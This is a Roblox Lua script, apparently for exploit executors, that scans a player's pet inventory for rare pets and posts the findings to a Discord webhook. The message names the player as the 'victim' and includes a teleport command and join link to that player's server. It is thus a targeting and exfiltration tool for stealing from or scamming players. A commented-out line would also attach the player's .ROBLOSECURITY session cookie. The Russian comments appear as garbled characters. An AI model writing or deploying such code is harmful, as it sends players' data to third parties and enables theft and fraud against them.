local Players = game:GetService("Players")
local lp = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- –ü—É—Ç–∏ –∫ –∏–Ω–≤–µ–Ω—Ç–∞—Ä—é –∏ —ç–∫–∏–ø–∏—Ä–æ–≤–∞–Ω–Ω—ã–º –ø–µ—Ç–∞–º
local inventoryPath = lp.PlayerGui.Tabs.Inventory.Menu.Categories.Pets.Inner.List.Container
local equippedPath = lp.PlayerGui.Tabs.Inventory.Menu.Categories.Pets.Inner.List.Equipped.List

-- –†–µ–¥–∫–æ—Å—Ç–∏, –∫–æ—Ç–æ—Ä—ã–µ –Ω–∞—Å –∏–Ω—Ç–µ—Ä–µ—Å—É—é—Ç
local VALID_RARITIES = {
    ["Mythical"] = true,
    ["Secret I"] = true,
    ["Secret II"] = true,
    ["Secret III"] = true
}

-- –¢–≤–æ–π Discord –≤–µ–±—Ö—É–∫
local webhook = "https://discord.com/api/webhooks/–í–ê–®_–í–ï–ë–•–£–ö_–ó–î–ï–°–¨"

-- HTTP requester (synapse, krnl –∏ —Ç.–¥.)
local HttpRequest = request or (syn and syn.request) or http_request or (http and http.request)

-- –¢–∞–±–ª–∏—Ü–∞ –¥–ª—è –ø–æ–¥—Å—á—ë—Ç–∞ –ø–æ —Ä–µ–¥–∫–æ—Å—Ç—è–º
local RarityCount = {
    ["Mythical"] = 0,
    ["Secret I"] = 0,
    ["Secret II"] = 0,
    ["Secret III"] = 0
}
local TotalValuablePets = 0

-- –§—É–Ω–∫—Ü–∏—è —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞ (–∏–Ω–≤–µ–Ω—Ç–∞—Ä—å + —ç–∫–∏–ø–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ)
local function scan(container, tag)
    for _, pet in ipairs(container:GetChildren()) do
        for _, child in ipairs(pet:GetChildren()) do
            if VALID_RARITIES[child.Name] then
                local id = pet:GetAttribute("Id")
                if id then
                    RarityCount[child.Name] = RarityCount[child.Name] + 1
                    TotalValuablePets = TotalValuablePets + 1
                    print(string.format("[%s] %s ‚Äî %s | ID: %s", tag, pet.Name, child.Name, id))
                end
            end
        end
    end
end

-- –°–∫–∞–Ω–∏—Ä—É–µ–º –∏–Ω–≤–µ–Ω—Ç–∞—Ä—å –∏ —ç–∫–∏–ø–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö
print("=== Scanning Inventory ===")
scan(inventoryPath, "Inventory")
print("=== Scanning Equipped ===")
scan(equippedPath, "Equipped")

print("–°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–æ. –í—Å–µ–≥–æ —Ü–µ–Ω–Ω—ã—Ö –ø–µ—Ç–æ–≤:", TotalValuablePets)

-- –ï—Å–ª–∏ –Ω–∏—á–µ–≥–æ —Ü–µ–Ω–Ω–æ–≥–æ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ ‚Äî –≤—ã—Ö–æ–¥–∏–º
if TotalValuablePets == 0 then
    print("–ù–µ—Ç —Ü–µ–Ω–Ω—ã—Ö –ø–µ—Ç–æ–≤ ‚Äî –≤–µ–±—Ö—É–∫ –Ω–µ –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç—Å—è.")
    return
end

-- === –ü–æ–ª—É—á–µ–Ω–∏–µ jobId —á–µ—Ä–µ–∑ Presence API ===
local function getPresenceJobId()
    if not HttpRequest then
        warn("[PRESENCE] –ù–µ—Ç HTTP requester")
        return nil
    end

    local userIds = {}
    local idToName = {}
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= lp then  -- –∏—Å–∫–ª—é—á–∞–µ–º —Å–µ–±—è, —á—Ç–æ–±—ã –Ω–µ –º–µ—à–∞–ª
            table.insert(userIds, p.UserId)
            idToName[p.UserId] = p.Name
        end
    end

    if #userIds == 0 then return nil end

    local body = HttpService:JSONEncode({userIds = userIds})
    local headers = {["Content-Type"] = "application/json"}

    -- –ï—Å–ª–∏ –µ—Å—Ç—å –∫—É–∫–∞ ‚Äî –¥–æ–±–∞–≤–ª—è–µ–º (–Ω–µ–æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ, –Ω–æ –º–æ–∂–µ—Ç –ø–æ–º–æ—á—å)
    -- if getgenv().Cookie then headers["Cookie"] = ".ROBLOSECURITY=" .. getgenv().Cookie end

    local success, response = pcall(function()
        return HttpRequest({
            Url = "https://presence.roblox.com/v1/presence/users",
            Method = "POST",
            Headers = headers,
            Body = body
        })
    end)

    if not success or not response or not response.Body then
        warn("[PRESENCE] –û—à–∏–±–∫–∞ –∑–∞–ø—Ä–æ—Å–∞")
        return nil
    end

    local parseSuccess, data = pcall(HttpService.JSONDecode, HttpService, response.Body)
    if not parseSuccess or not data.userPresences then
        warn("[PRESENCE] –ù–µ —É–¥–∞–ª–æ—Å—å —Ä–∞—Å–ø–∞—Ä—Å–∏—Ç—å –æ—Ç–≤–µ—Ç")
        return nil
    end

    for _, presence in ipairs(data.userPresences) do
        if presence.placeId and presence.gameId then
            return {
                placeId = tostring(presence.placeId),
                jobId = tostring(presence.gameId),
                playerName = idToName[presence.userId] or "Unknown"
            }
        end
    end

    return nil
end

-- === –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ –≤–µ–±—Ö—É–∫ ===
local function sendToWebhook(presenceData)
    if not HttpRequest then return false end

    local placeId = presenceData.placeId
    local jobId = presenceData.jobId

    -- –§–æ—Ä–º–∏—Ä—É–µ–º —Å–ø–∏—Å–æ–∫ —Ä–µ–¥–∫–æ—Å—Ç–µ–π
    local rarityLines = {}
    for rarity, count in pairs(RarityCount) do
        if count > 0 then
            table.insert(rarityLines, string.format("**%s**: %d", rarity, count))
        end
    end

    local rarityText = table.concat(rarityLines, "\n")
    if rarityText == "" then rarityText = "–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö" end

    -- –ö–æ–º–∞–Ω–¥–∞ —Ç–µ–ª–µ–ø–æ—Ä—Ç–∞
    local teleportCommand = string.format(
        "game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s')",
        placeId, jobId
    )

    local payload = {
        ["content"] = "@everyone\n" .. teleportCommand,  -- –º–æ–∂–Ω–æ —É–±—Ä–∞—Ç—å @everyone –µ—Å–ª–∏ –Ω–µ –Ω—É–∂–Ω–æ
        ["embeds"] = {{
            ["title"] = "üé≤ –ù–∞–π–¥–µ–Ω—ã —Ü–µ–Ω–Ω—ã–µ –ø–µ—Ç—ã!",
            ["description"] = string.format("**–ñ–µ—Ä—Ç–≤–∞:** %s\n**–°–µ—Ä–≤–µ—Ä:** %s –ø–µ—Ç–æ–≤ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ", lp.Name, #Players:GetPlayers()),
            ["color"] = 16711680,  -- –∫—Ä–∞—Å–Ω—ã–π
            ["fields"] = {
                {
                    ["name"] = "–†–µ–¥–∫–æ—Å—Ç–∏ –ø–µ—Ç–æ–≤:",
                    ["value"] = rarityText,
                    ["inline"] = false
                },
                {
                    ["name"] = "–û–±—â–µ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ:",
                    ["value"] = tostring(TotalValuablePets),
                    ["inline"] = true
                },
                {
                    ["name"] = "Join link (–∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–∞):",
                    ["value"] = string.format("https://www.roblox.com/games/%s/?jobId=%s", placeId, jobId),
                    ["inline"] = false
                }
            },
            ["footer"] = {["text"] = "Pet Simulator Scanner | " .. os.date("%Y-%m-%d %H:%M")}
        }}
    }

    local body = HttpService:JSONEncode(payload)
    local success, resp = pcall(function()
        return HttpRequest({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = body
        })
    end)

    if success and resp and (resp.StatusCode == 200 or resp.StatusCode == 204) then
        print("[WEBHOOK] –£—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ!")
        return true
    else
        warn("[WEBHOOK] –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏:", resp and resp.StatusCode or "unknown")
        return false
    end
end

-- === –û—Å–Ω–æ–≤–Ω–∞—è –ª–æ–≥–∏–∫–∞ ===
local presence = getPresenceJobId()

if presence then
    print("[PRESENCE] –£—Å–ø–µ—à–Ω–æ –ø–æ–ª—É—á–µ–Ω jobId:", presence.jobId)
    sendToWebhook(presence)
else
    warn("[PRESENCE] –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å jobId ‚Äî –≤–µ–±—Ö—É–∫ –ù–ï –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω.")
end
